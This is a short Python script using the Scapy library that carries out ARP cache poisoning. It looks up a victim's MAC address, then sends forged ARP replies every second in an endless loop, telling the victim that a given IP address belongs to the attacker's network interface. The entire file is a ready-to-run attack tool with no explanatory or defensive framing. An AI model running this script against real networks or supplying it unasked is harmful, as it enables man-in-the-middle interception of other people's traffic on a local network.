from scapy.all import *
import sys, time

victim_ip, fake_ip = sys.argv[1], sys.argv[2]
victim_mac = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip),timeout=2,verbose=False)[0][0][1].hwsrc

while True:
    send(ARP(op=2,pdst=victim_ip,hwdst=victim_mac,psrc=fake_ip),verbose=False)
    print(f"[+] {fake_ip} is-at {get_if_hwaddr('eth0')}")
    time.sleep(1)